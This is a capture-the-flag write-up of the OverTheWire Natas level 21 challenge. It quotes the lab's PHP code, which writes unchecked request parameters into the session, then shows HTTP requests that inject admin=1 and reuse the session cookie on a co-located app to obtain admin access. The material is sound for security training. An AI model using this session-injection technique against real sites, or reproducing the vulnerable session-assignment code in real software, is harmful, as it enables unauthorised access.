# Natas21
#natas #Session #burp-suite 
## Vulnerability:
Session Manipulation / Insecure Session Variable Assignment
## Technique:
Injected `admin=1` into the experimenter app's session, then used the same PHPSESSID on the main app to trigger admin access.
#### Steps:
###### 1) Analyzing the web applications source code:
We'll start with analyzing the first application: `http://natas21.natas.labs.overthewire.org`.
**Screenshot:**

<img width="1201" height="451" alt="image" src="https://github.com/user-attachments/assets/d0024c7a-d8dd-4ef6-95e4-0252fa65c0fa" />

**Source Code:**
```php
<?php  
function print_credentials() { /* {{{ */   
   if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {  
    print "You are an admin. The credentials for the next level are:<br>";  
    print "<pre>Username: natas22\n";  
    print "Password: <censored></pre>";  
    } else {  
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";  
    }  
}  
/* }}} */  
  
session_start();  
print_credentials();  
?>
```
Like the previous levels, to retrieve the credentials, we need to set `$_SESSION["admin"]` to 1.

Next, we'll check the source code of the second web application: `http://natas21-experimenter.natas.labs.overthewire.org`.
**Screenshot:**

<img width="1046" height="682" alt="image" src="https://github.com/user-attachments/assets/5fe11ba9-239b-4fe4-85c3-fdcec22f1798" />

**Source Code:**
```php
<?php

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
        $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");

$form = "";

$form .= '<form action="index.php" method="POST">';

foreach($validkeys as $key => $defval) {

    $val = $defval;

    if(array_key_exists($key, $_SESSION)) {
        $val = $_SESSION[$key];
    }
    else {
        $_SESSION[$key] = $val;
    }

    $form .= "$key: <input name='$key' value='$val' /><br>";
}

$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";

$example = "<div style='$style'>Hello world!</div>";

?>
```
The code revealed that the web application stores all request parameters as session variables without validating or restricting their names:
```php
foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
}
```
So we can manipulate this behavior to set the `admin` session variable to `1`.
###### 2) Analyzing the web application requests
**First web application request:**
```http
GET / HTTP/1.1
Host: natas21.natas.labs.overthewire.org
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas21-experimenter.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Cookie: <REDACTED>; PHPSESSID=ls1q94g27hk3dn8olq3skp74uh
Connection: keep-alive
```
**Second web application request (submitting the update):**
```http
POST /index.php HTTP/1.1
Host: natas21-experimenter.natas.labs.overthewire.org
Content-Length: 69
Cache-Control: max-age=0
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Origin: http://natas21-experimenter.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas21-experimenter.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Cookie: <REDACTED>; PHPSESSID=m9vs3uf9oh7tbhso6e3st146ei
Connection: keep-alive

align=center&fontsize=100%25&bgcolor=yellow&submit=Update
```
We noticed that the two web applications use different `PHPSESSID` values.
Both applications are co-located on the same server and share the same session storage directory, meaning a session created on one app is readable by the other, as long as the same PHPSESSID cookie is used.
Therefore, we need to inject `admin=1` into the second web application's request and then send the first web application's request using the same `PHPSESSID`.
###### 3) Exploiting the Session Manipulation Vulnerability
**Second web application:**
```http
POST /index.php HTTP/1.1
Host: natas21-experimenter.natas.labs.overthewire.org
Content-Length: 65
Cache-Control: max-age=0
Authorization: <REDACTED>
Accept-Language: en-US,en;q=0.9
Origin: http://natas21-experimenter.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas21-experimenter.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Cookie: <REDACTED>; PHPSESSID=h5vs3uf9oh7tbhso6e3st146ei
Connection: keep-alive

align=center&admin=1&fontsize=100%25&bgcolor=yellow&submit=Update
```
This creates the session variable `$_SESSION["admin"] = 1` in the second web application's session. We then reuse the same `PHPSESSID` when sending a request to the first web application.
**First web application:**
```http
GET / HTTP/1.1
Host: natas21.natas.labs.overthewire.org
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas21-experimenter.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Cookie: <REDACTED>; PHPSESSID=h5vs3uf9oh7tbhso6e3st146ei
Connection: keep-alive
```
**Result:**
```http
HTTP/1.1 200 OK
Date: Fri, 07 Aug 2026 14:58:56 GMT
Server: Apache/2.4.66 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1203
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```
```html
<html>
<head>
    <!-- This stuff in the header has nothing to do with the level -->

    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />

    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>

    <script>
        var wechallinfo = {
            "level": "natas21",
            "pass": <NATAS20_PASSWORD>
        };
    </script>
</head>

<body>

    <h1>natas21</h1>

    <div id="content">

        <p>
            <b>
                Note: this website is colocated with
                <a href="http://natas21-experimenter.natas.labs.overthewire.org">
                    http://natas21-experimenter.natas.labs.overthewire.org
                </a>
            </b>
        </p>

        You are an admin. The credentials for the next level are:

        <br>

        <pre>Username: natas22
Password: <PASSWORD></pre>

        <div id="viewsource">
            <a href="index-source.html">View sourcecode</a>
        </div>

    </div>

</body>
</html>
```
The server responds by recognizing us as an administrator and reveals the credentials for the next level.
## Password found:
[Not disclosed — solve it yourself!]
## Previous Level:
[Natas20](./Natas20.md)
## Next Level:
[Natas22](./Natas22.md)
